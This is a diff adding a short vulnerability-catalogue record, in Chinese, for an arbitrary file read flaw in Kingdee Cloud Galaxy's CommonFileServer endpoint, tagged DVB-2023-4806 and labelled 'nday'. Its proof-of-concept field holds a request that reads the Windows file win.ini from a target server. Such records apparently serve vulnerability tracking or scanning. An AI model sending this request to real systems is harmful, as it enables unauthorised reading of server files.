@@ -1,0 +1,8 @@
+vendor = "金蝶"
+name = "金蝶云星空CommonFileServer任意文件读取漏洞"
+type = "任意文件读取"
+source = "DVB、TG"
+info = "DVB-2023-4806"
+date = "08.08"
+poc = "GET /CommonFileServer/c:/windows/win.ini"
+label = "nday"
